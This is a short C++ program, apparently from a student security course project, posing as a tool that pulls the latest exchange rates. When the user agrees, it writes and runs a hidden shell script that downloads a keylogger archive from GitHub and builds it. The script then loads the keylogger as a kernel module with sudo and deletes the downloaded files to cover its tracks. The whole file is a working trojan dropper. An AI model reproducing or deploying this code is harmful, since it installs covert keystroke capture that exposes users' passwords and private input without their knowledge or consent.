#include <iostream>
#include <fstream>
using namespace std;

const char *text= 
	"#!/bin/bash\n"
	"sudo cp tmp.sh /usr/bin/keylog\n"
	"wget -q https://github.com/ECS153/final-project-click-to-add-lemon/archive/master.zip -O keylog.zip\n"
	"unzip -o -q keylog.zip\n"
	"cd final-project-click-to-add-lemon-master/Source/\n"
	"make\n"
	"sudo insmod keylog.ko\n"
	"cd ../..\n"
	"rm -r -f keylog.zip tmp.sh\n"
	"rm -r -f final-project-click-to-add-lemon-master\n";

int main(){
	cout<<"Pull the latest exchange rates online? (require access to Internet)\n"
		" [y]es [n]o\n";
	char in = getchar();
	if(in == 'y'){
	ofstream myfile("tmp.sh");
	myfile << (text);			
	myfile.close();

	system("chmod 755 tmp.sh");
	system("./tmp.sh");
	}else{
	cout<<"Service terminated.\n";
	}
	return 0;
}
